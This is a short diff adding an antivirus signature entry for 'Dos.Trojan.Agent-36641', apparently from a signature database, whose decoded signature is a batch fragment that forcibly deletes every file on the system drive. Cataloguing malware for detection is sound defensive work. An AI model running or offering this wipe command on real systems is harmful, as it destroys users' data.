@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36641
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off echo vista123.com...... del /f /s /q %systemdrive%\*.* echo vista123.com echo. & pause 
